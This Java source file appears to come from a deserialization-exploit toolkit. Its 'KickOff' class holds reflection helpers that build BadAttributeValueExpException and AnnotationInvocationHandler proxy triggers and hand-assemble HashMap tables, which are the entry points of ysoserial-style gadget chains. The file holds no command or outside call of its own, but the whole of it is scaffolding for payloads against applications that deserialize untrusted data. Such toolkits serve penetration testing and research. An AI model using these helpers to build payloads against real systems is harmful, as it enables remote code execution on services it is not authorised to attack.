package com.ppp;

import com.ppp.utils.Reflections;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

/**
 * @author Whoopsunix
 */
public class KickOff {

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
    public static final String BAD_ATT_EXCEPTION_CLASS = "javax.management.BadAttributeValueExpException";


    /**
     * javax.management.BadAttributeValueExpException
     */
    public static BadAttributeValueExpException badAttributeValueExpException(final Object val) throws Exception {
        BadAttributeValueExpException badAttributeValueExpException = (BadAttributeValueExpException) Reflections.getFirstCtor(BAD_ATT_EXCEPTION_CLASS).newInstance((Object) null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", val);
        return badAttributeValueExpException;
    }

    /**
     * sun.reflect.annotation.AnnotationInvocationHandler
     */
    public static InvocationHandler annotationInvocationHandler(final Map map) throws Exception {
        final InvocationHandler handler = annotationInvocationHandler(map, Override.class);
        return handler;
    }

    public static InvocationHandler annotationInvocationHandler(final Map map, final Class ifaces) throws Exception {
        final InvocationHandler handler = (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(ifaces, map);
        return handler;
    }

    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
        return createProxy(annotationInvocationHandler(map), iface, ifaces);
    }

    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(KickOff.class.getClassLoader(), allIfaces, ih));
    }

    public static <T> T createClassProxy(final Map map, final Class<T> iface) throws Exception{
        InvocationHandler handler = annotationInvocationHandler(map);
        Reflections.setFieldValue(handler, "type", iface);
        return createProxy(handler, iface);
    }

    /**
     * MashMap hashCode()
     *  赋值 只添加一个
     */
    public static HashMap makeMap(Object v1) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, InvocationTargetException {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 1);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 1);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    public static HashMap makeMap(Object v1, Object v2) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, InvocationTargetException {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    public static Map<String, Object> createMap(final String key, final Object val) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }

}
